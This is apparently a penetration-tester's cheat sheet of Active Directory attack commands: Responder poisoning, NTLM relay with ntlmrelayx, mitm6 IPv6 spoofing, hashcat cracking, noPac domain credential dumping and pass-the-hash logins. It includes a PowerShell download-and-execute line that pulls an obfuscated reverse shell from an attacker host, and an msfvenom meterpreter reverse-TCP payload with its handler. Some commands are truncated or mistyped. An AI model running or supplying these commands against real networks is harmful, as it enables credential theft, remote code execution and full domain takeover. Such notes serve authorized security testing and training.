Attacking IPv6 
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
``` 

## Responder 
The Responder is an IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay. Internal Penetration Testing has been successful in obtaining a foothold or compromising entire domains through a technique called NTLM relaying. This is still alive. I will cover classic and modern techniques to do NTLM relay attacks, together with IPv6 network abuse with MIMT6.  

```
Most successful command options are -dwP. 

responder -I eth0 -dwP 
-d, --DHCP: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False
-d,--wpad: Start the WPAD rogue proxy server. Default value is False
-P, --ProxyAuth: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. 
```

### Attack 0 - Just observe the environment (No poisoning)
```bash
# Comment out IPv6 addresses in /etc/resolv.conf 

# Start the responder 
responder -I eth0 -A

# You should see some NBT-NS and LLMNR network flows. The responder might capture hashes. 
# Rembember that NetNTLM is not actual NTLM hashes that you can pass the hash to other machines. 
```

### Attack 0.5 - LLMNR/NBT-NS Poisoning through SMB
You will start poisoning LLMNR/MBT-NS network flow. 
```bash
# Start the responder
responder -I eth0

# Victim (or Attacker in a compromised machine) will initiate SMB connection to the Kali machine  

# Crack the hashes
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
In a real world attack scenario, after setting up the responder's listener, we have to wait for users in the network to search for a non-existing machine. Or maybe  you do social engineering that embeds a link to the attacker's address in emails or you may find some vulnerabilities (RFI, SSRF, SQLi-RCE, any other) that can allows an attacker to invoke a SMB connection to their machine. 

### Attack 0.5 - LLMNR/NBT-NS Poisoning through SMB with Domain User to Domain Admin
```bash
# Start the responder
responder -I eth0 -

# Victim (or Attacker in a compromised machine) will initiate SMB connection to the Kali machine  

# Crack the hashes
hashcat -m 5600 -O -w 3 ntlmv2hash.txt /usr/share/wordlists/rockyou.txt -r /opt/passwdcrack/hashcat-rule/clem9669_small.rule

# Dump all credentials in Domain Controllers
python /opt/ad/noPac/noPac.py contoso.local/iptracej:'iptracej' -dc-ip 10.10.10.1 --impersonate Administrator -dump

# Remote Code Execution to DC
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b contoso.local/Administrator@10.10.10.1 whoami

# Obfuscation
./chimera.sh -f ~/pnpt/ad/shell.ps1 -o /tmp/chimera.ps1 -g -v -t -j -i -c -h -s -b -e

# Nishang Reverse-shell
atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b contoso.local/Administrator@10.10.10.1 "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.100:8000/chimera.ps1')"


```

### Attack 0.5 again - LLMNR/NBT-NS Poisoning through WPAD
```bash
# Start the responder 
responder -I eth0 -wd

# Victim (or Attacker in compromised machine) will enter credentials to access

# Crack the hashes 
hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt
```

### Attack 1 - Classic NTLM relay
If an attacker is able to relay authentication of a user to a system that has SMB Signing turned off (default) and that user happens to be a local admin on that system, the default behavior of NTLM relay is to dump the security account manager database and reveal the password hashes of local accounts.

#### Obtain a NTLM hash 

```bash
# Ensure you configure the /etc/responder/Responder.conf file and disable SMB and HTTP servers. 
sudo vi /etc/responder/Responder.conf

# Collect a list of victim machines 
crackmapexec smb 10.0.0.0/24 --gen-relay-list /tmp/targets.txt 

# Start the responder 
sudo responder -I eth0 -PvdDw

# Check /tmp/tragets.txt first and edit the endpoints if required. 
ntlmrelayx.py -smb2support -tf /tmp/targets.txt 

# Victim (or Attacker in compromised machine) will will access to Kali machine. 

# Crack the hashes
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Get an access to Shares and some interactive operations 

```bash
# Start the ntlmrelay with interactive option (i)
ntlmrelayx.py -smb2support -tf /tmp/targets.txt -i 

# Victim (or Attacker in compromised machine) will will access to Kali machine.

# connect to the localhost and the port
nc -nv 127.0.0.1 11000 # Check port number 

# Use commands. Type help for more information. 
shares
use C$ 
ls 
```

#### Get a meterpreter session with a command execution option

```bash 
# Create a meterpreter exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.208 LPORT=80 -f exe -o rshell.exe

# Start Metasploit multi/handler session with auto-migration set 
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.0.0.208 ;set LPORT 80;run -j"

# Start the responder 
sudo responder -I eth0 -PvdDw

# Start the ntlmrelay with execution option (-e)
ntlmrelayx.py -smb2support -tf /tmp/targets.txt -e ./rshell.exe --no-http-server # execution option with --no-http-server option is for port 80 used.

# Victim (or Attacker in compromised machine) will will access to Kali machine.  
# Meterpreter session will kick off. 

# Start the ntlmrelay with command option (-c)
ntlmrelayx.py -smb2support -tf /tmp/targets.txt -c whoami  
```

### Attack 2 - Proxy Chaining the SMB connection using RESPONDER and NTLM Relay
```bash
# Collect a list of victim machines where SMB signing is OFF
crackmapexec smb 10.10.10.0/24 --gen-relay-list /tmp/10.10.10.0.txt

# Add socks4 127.0.0.1 1080
sudo vi /etc/proxychains4.conf 

# Ensure you configure the /etc/responder/Responder.conf file and disable SMB and HTTP servers. 
sudo vi /etc/responder/Responder.conf 

ntlmrelayx.py -socks -smb2support -tf /tmp/10.10.10.0.txt

# Dump the hashes and secrets or connect to the victim machine 
proxychains4 -q secretsdump.py FILE01/Administrator:anypassword@10.10.10.21
proxychains4 -q smbexec.py FILE01/Administrator:anypassord@10.10.10.21

# This will work with non admin users 
proxychains4 -q smbclient.py FILE01/Administrator:anypassword@10.10.10.21

# If winrm is open, use the EvilWin
evil-winrm -u Administrator -H '849bb5d6ce5262b05fb7547db48b54a3' -i 192.168.1.161

# Remote desktop may work
xfreerdp /u:Administrator /v:10.10.10.21 /pth:849bb5d6ce5262b05fb7547db48b54a3 +clipboard
```

### Attack 3 MIMT6 - WPAD exploitation
mitm6 is a tool which focusses on an easy to setup solution that selectively attacks hosts and spoofs DNS replies, while minimizing the impact on the networkâ€™s regular operation.


```bash
cd /opt/ad/mitm6/mitm6    
# At Kali, start the mitm6 and ntlmrelay with a fake wpad address
python mitm6.py -d contoso.local -i eth1
ntlmrelayx.py -6 -t ldaps://10.10.10.1 -wh fakewd.contoso.local -l lootme

# Restart the victim machine. You see lengthy responses from the victim machine.

# Check all html files for your reference
cd lootme

# This will add a computer with user name and password to the DC 
ntlmrelayx.py -6 -t ldaps://10.10.10.1 -wh fakewd.contoso.local -l lootme --add-computer
# Restart the victim machine. You see a message for adding the computer account with username and password
